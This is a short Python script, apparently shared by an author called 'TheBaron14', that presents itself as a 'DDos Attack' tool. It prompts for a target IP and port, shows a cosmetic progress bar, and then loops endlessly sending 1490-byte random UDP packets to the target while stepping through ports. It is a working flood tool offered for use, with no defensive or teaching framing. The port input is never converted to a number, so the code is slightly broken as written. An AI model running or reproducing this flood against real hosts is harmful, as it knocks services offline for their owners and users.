import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print('''

  _____ _  _ ___    ___   _   ___  ___  _  _ 
 |_   _| || | __|__| _ ) /_\ | _ \/ _ \| \| |
   | | | __ | _|___| _ \/ _ \|   / (_) | .` |
   |_| |_||_|___|  |___/_/ \_\_|_\\___/|_|\_|


''')
print ("Author   : TheBaron14")
print ("You Tube : https://www.youtube.com/channel/UC1Tri7xStcHNrlwVB56PjUQ")
print ("Blogger   : thebaron14.blogspot.com")
print ("Facebook : https://www.facebook.com/TheBaron14")
print
ip = str(input("IP Target : "))
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(1)
print ("[=====               ] 25%")
time.sleep(1)
print ("[==========          ] 50%")
time.sleep(1)
print ("[===============     ] 75%")
time.sleep(1)
print ("[====================] 100%")
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

